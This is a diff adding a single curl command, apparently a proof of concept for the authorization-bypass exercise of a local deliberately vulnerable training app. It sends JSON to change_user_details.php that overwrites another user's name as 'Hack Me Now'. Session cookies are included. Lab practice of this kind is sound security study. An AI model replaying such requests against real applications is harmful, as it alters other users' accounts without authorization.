@@ -1,0 +1,17 @@
+curl 'http://localhost:8101/vulnerabilities/authbypass/change_user_details.php' \
+  -H 'Accept: application/json' \
+  -H 'Accept-Language: en-US,en' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/json' \
+  -H 'Cookie: pma_lang=en; pmaUser-1=hRea%2B3D%2FH9rX94T9gCBpXX1XEfzVaJhebmLPwtbYB1iNG9I%2FFKRgwxHQ30o%3D; PHPSESSID=9d33f7b7b3bfbf512c9f3c42ec890ca5; security=high' \
+  -H 'Origin: http://localhost:8101' \
+  -H 'Referer: http://localhost:8101/vulnerabilities/authbypass/' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-GPC: 1' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
+  -H 'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Linux"' \
+  --data-raw '{"id":3,"first_name":"Hack","surname":"Me Now"}'
